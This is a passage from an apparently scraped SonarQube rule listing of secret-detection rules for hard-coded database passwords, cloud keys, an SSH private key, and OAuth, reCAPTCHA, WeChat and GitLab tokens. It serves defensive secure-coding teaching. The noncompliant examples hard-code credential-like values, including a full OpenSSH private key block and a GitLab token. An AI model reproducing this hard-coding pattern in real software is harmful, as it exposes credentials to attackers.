<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6698">
              secrets:S6698
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords in PostgreSQL are used to authenticate users against the database engine. They are associated with user accounts that are granted
specific permissions over the database and its hosted data.</p>
<p>If a PostgreSQL password leaks to an unintended audience, it can have serious consequences for the security of your database, the data stored
within it, and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a PostgreSQL database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on
the purposes the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the PostgreSQL instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>By default, no connection information is logged by PostgreSQL server. The <code>log_connections</code> parameter must be set to <code>true</code>
in the server configuration for this to happen.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
uri &#61; &#34;postgres://foouser:foopass&#64;example.com/testdb&#34;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os

user &#61; os.environ[&#34;PG_USER&#34;]
password &#61; os.environ[&#34;PG_PASSWORD&#34;]
uri &#61; f&#34;postgres://{user}:{password}&#64;example.com/testdb&#34;
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> PostgreSQL Documentation - <a href="https://www.postgresql.org/docs/15/client-authentication.html" rel="nofollow">Client Authentication</a> </li><li> PostgreSQL Documentation - <a href="https://www.postgresql.org/docs/current/runtime-config-logging.html" rel="nofollow">Error Reporting and Logging</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6335">
              secrets:S6335
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Google Cloud service accounts are designed to authenticate and authorize requests to Google APIs.</p>
<p>If your application interacts with Google Cloud services then it requires a service account to access all the resources it needs to function
properly. Resources that can be accessed depend on the permission granted to the service account. Establishing the identity of a service account
relies on a public/private key pair. It’s common for private keys to be distributed through a JSON file that your application will then use to consume
Google APIs.</p>
<p>A key may authenticate to a high privilege which has unrestricted access to all resources in your Google Cloud project, including billing
information.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Only administrators should have access to the service account key used by your application.</p>
<p>As a consequence, service account keys should not be stored along with the application code as they would grant special privileges to anyone who
has access to the application source code.</p>
<p>Keys should be stored outside of the code in a file that is never committed to your application code repository.</p>
<p>If possible, a better alternative is to use your cloud provider’s service for managing secrets. On Google Cloud this service is called <a href="https://cloud.google.com/secret-manager" rel="nofollow">Secret Manager</a>.</p>
<p>When keys are disclosed in the application code, consider them as compromised and revoke them immediately.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://cloud.google.com/iam/docs/creating-managing-service-account-keys" rel="nofollow">Google Cloud</a> - Creating and managing service account
  keys </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6290">
              secrets:S6290
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>AWS credentials are designed to authenticate and authorize requests to AWS.</p>
<p>If your application interacts with AWS then it requires AWS credentials to access all the resources it needs to function properly. Resources that
can be accessed depend on the permission granted to the AWS account. These credentials may authenticate to the AWS account root user who has
unrestricted access to all resources in your AWS account, including billing information.</p>
<p>This rule flags instances of:</p>
<ul><li> AWS Secret Access Key </li><li> AWS Access ID </li><li> AWS Session Token </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<p>Only administrators should have access to the AWS credentials used by your application.</p>
<p>As a consequence, AWS credentials should not be stored along with the application code as they would grant special privilege to anyone who has
access to the application source code.</p>
<p>Credentials should be stored outside of the code in a file that is never committed to your application code repository.</p>
<p>If possible, a better alternative is to use your cloud provider’s service for managing secrets. On AWS this service is called <a href="https://aws.amazon.com/fr/secrets-manager/" rel="nofollow">Secrets Manager</a>.</p>
<p>When credentials are disclosed in the application code, consider them as compromised and revoke them immediately.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6693">
              secrets:S6693
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>SSH private keys are used for authentication and secure communication in SSH (Secure Shell) protocols. They are a form of asymmetric cryptography,
where a pair of keys is generated: a private key and a corresponding public key. SSH keys provide a secure and efficient way to authenticate and
establish secure connections between clients and servers. They are widely used for remote login, file transfer, and secure remote administration.</p>
<p>When an SSH private key is leaked to an unintended audience, it can have severe consequences for security and confidentiality. One of the primary
outcomes is unauthorized access. The unintended audience can exploit the leaked private key to authenticate themselves as the legitimate owner,
gaining unauthorized entry to systems, servers, or accounts that accept the key for authentication. This unauthorized access opens the door for
various malicious activities, including data breaches, unauthorized modifications, and misuse of sensitive information.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>Depending on the information system the key is used to authenticate against, the audit method might change. For example, on Linux systems, the
system-wide authentication logs could be used to audit recent connections from an affected account.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
String key &#61; &#34;&#34;&#34;
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    QyNTUxOQAAACDktj2RM1D2wRTQ0H&#43;YZsFqnAuZrqBNEB4PpJ5xm73nWwAAAJgJVPFECVTx
    RAAAAAtzc2gtZWQyNTUxOQAAACDktj2RM1D2wRTQ0H&#43;YZsFqnAuZrqBNEB4PpJ5xm73nWw
    AAAECQ8Nzp6a1ZJgS3SWh2pMxe90W9tZVDZ&#43;MZT35GjCJK2uS2PZEzUPbBFNDQf5hmwWqc
    C5muoE0QHg&#43;knnGbvedbAAAAFGdhZXRhbmZlcnJ5QFBDLUwwMDc3AQ&#61;&#61;
    -----END OPENSSH PRIVATE KEY-----&#34;&#34;&#34;;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
String key &#61; System.getenv(&#34;SSH_KEY&#34;);
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6692">
              secrets:S6692
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A reCaptcha secret key is a unique token that is used to verify the authenticity of reCaptcha requests made from an application to the reCaptcha
service. It is a key component in ensuring CAPTCHAs challenges issued by the application are properly solved and verified.</p>
<p>If a reCaptcha secret key leaks to an unintended audience, attackers with access to it will be able to forge CAPTCHA responses without solving
them. It will allow them to bypass the CAPTCHA challenge verification.</p>
<p>This can lead to an influx of spam submissions, automated attacks, or unauthorized access attempts depending on the feature the CAPTCHA mechanism
is intended to protect.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;recaptcha_secret&#34;, &#34;6LcaQa4mAAAAAFvhmzAd2hErGBSt4FC&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;recaptcha_secret&#34;, System.getenv(&#34;RECAPTCHA_SECRET&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> Google reCAPTCHA Documentation - <a href="https://developers.google.com/recaptcha/intro" rel="nofollow">Developer’s Guide</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6695">
              secrets:S6695
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>WeChat application keys are used for authentication and authorization purposes when integrating third-party applications with the WeChat
platform.</p>
<p>If a WeChat app key were to leak to an unintended audience, it could have severe consequences for both the app developer and the app users. The
unauthorized individuals or malicious actors who gain access to the app key would have the potential to exploit it in various ways.</p>
<p>One of the primary risks is the unauthorized access to sensitive user data associated with the WeChat app. This could include personal information,
chat logs, and other private data that users have shared on the platform. The leaked app key could provide a gateway for unauthorized individuals to
access and misuse this data, compromising the privacy and security of WeChat users.</p>
<p>Another significant concern is the potential for impersonation and unauthorized actions. With the leaked app key, malicious actors could
impersonate the app and perform actions on behalf of the app without proper authorization. This could lead to various security breaches, such as
sending spam messages, spreading malware, or conducting phishing attacks on unsuspecting WeChat users.</p>
<p>Furthermore, the leaked app key could enable unauthorized parties to manipulate or disrupt the functionality of the WeChat app. They could tamper
with app settings, inject malicious code, or even take control of the app’s user base. Such actions could result in a loss of user trust, service
disruptions, and reputational damage for both the app developer and the WeChat platform.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;secret_key&#34;, &#34;40b6b70508b47cbfb4ee39feb617a05a&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;secret_key&#34;, System.getenv(&#34;SECRET_KEY&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6694">
              secrets:S6694
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords in MongoDB are used to authenticate users against the database engine. They are associated with user accounts that are granted specific
permissions over the database and its hosted data.</p>
<p>If a MongoDB password leaks to an unintended audience, it can have serious consequences for the security of your database, the data stored within
it, and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a MongoDB database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on the
purposes the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the MongoDB instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>MongoDB instances maintain a log that includes user authentication events. This one could be used to audit recent malicious connections.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
uri &#61; &#34;mongodb://foouser:foopass&#64;example.com/testdb&#34;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os

user &#61; os.environ[&#34;MONGO_USER&#34;]
password &#61; os.environ[&#34;MONGO_PASSWORD&#34;]
uri &#61; f&#34;mongodb://{user}:{password}&#64;example.com/testdb&#34;
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> MongoDB Documentation - <a href="https://www.mongodb.com/docs/manual/reference/log-messages/" rel="nofollow">Log Messages</a> </li><li> MongoDB Documentation - <a href="https://www.mongodb.com/docs/manual/core/authentication/" rel="nofollow">Authentication</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6292">
              secrets:S6292
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Amazon Marketplace Web Service credentials are designed to authenticate and authorize Amazon sellers.</p>
<p>If your application interacts with Amazon MWS then it requires credentials to access all the resources it needs to function properly. The
credentials authenticate to a seller account which can have access to resources like products, orders, price or shipment information.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Only administrators should have access to the MWS credentials used by your application.</p>
<p>As a consequence, MWS credentials should not be stored along with the application code as they would grant special privilege to anyone who has
access to the application source code.</p>
<p>Credentials should be stored outside of the code in a file that is never committed to your application code repository.</p>
<p>If possible, a better alternative is to use your cloud provider’s service for managing secrets. On AWS this service is called <a href="https://aws.amazon.com/fr/secrets-manager/" rel="nofollow">Secrets Manager</a>.</p>
<p>When credentials are disclosed in the application code, consider them as compromised and revoke them immediately.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6691">
              secrets:S6691
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A Google client OAuth secret is a confidential string that is used to authenticate and authorize applications when they interact with Google APIs.
It is a part of the OAuth 2.0 protocol, which allows applications to access user data on their behalf.</p>
<p>The client secret is used in the OAuth flow to verify the identity of the application and ensure that only authorized applications can access user
data. It is typically used in combination with a client ID, which identifies the application itself.</p>
<p>If a Google client OAuth secret leaks to an unintended audience, it can have serious security implications. Attackers who obtain the client secret
can use it to impersonate the application and gain unauthorized access to user data. They can potentially access sensitive information, modify data,
or perform actions on behalf of the user without their consent.</p>
<p>The exact capabilities of the attackers will depend on the authorizations the corresponding application has been granted.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>Google Cloud console provides a Logs Explorer feature that can be used to audit recent access to a cloud infrastructure.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;client_secret&#34;, &#34;TgxYWFmND-1NTYwNTgzMDM3N&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;client_secret&#34;, System.getenv(&#34;CLIENT_SECRET&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> Google Documentation - <a href="https://cloud.google.com/docs/security/compromised-credentials" rel="nofollow">Handling compromised Google Cloud
  credentials</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6690">
              secrets:S6690
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>GitLab tokens are used for authentication and authorization purposes. They are essentially access credentials that allow users or applications to
interact with the GitLab API.</p>
<p>With a GitLab token, you can perform various operations such as creating, reading, updating, and deleting resources like repositories, issues,
merge requests, and more. Tokens can also be scoped to limit the permissions and actions that can be performed.</p>
<p>A leaked GitLab token can have significant consequences for the security and integrity of the associated account and resources. It exposes the
account to unauthorized access, potentially leading to data breaches and malicious actions. The unintended audience can exploit the leaked token to
gain unauthorized entry into the GitLab account, allowing them to view, modify, or delete repositories, issues, and other resources. This unauthorized
access can result in the exposure of sensitive data, such as proprietary code, customer information, or confidential documents, leading to potential
data breaches.</p>
<p>Moreover, the unintended audience can perform malicious actions within the account, introducing vulnerabilities, injecting malicious code, or
tampering with settings. This can compromise the security of the account and the integrity of the software development process.</p>
<p>Additionally, a leaked token can enable the unintended audience to take control of the GitLab account, potentially changing passwords, modifying
settings, and adding or removing collaborators. This account takeover can disrupt development and collaboration workflows, causing reputational damage
and operational disruptions.</p>
<p>Furthermore, the impact of a leaked token extends beyond the immediate account compromise. It can have regulatory and compliance implications,
requiring organizations to report the breach, notify affected parties, and potentially face legal and financial consequences.</p>
<p>In general, the compromise of a GitLab token would lead to consequences referred to as supply chain attacks that can affect more than one’s own
organization.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;token&#34;, &#34;glpat-zcs1FfaxGnHfvzd7ExHz&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;token&#34;, System.getenv(&#34;TOKEN&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
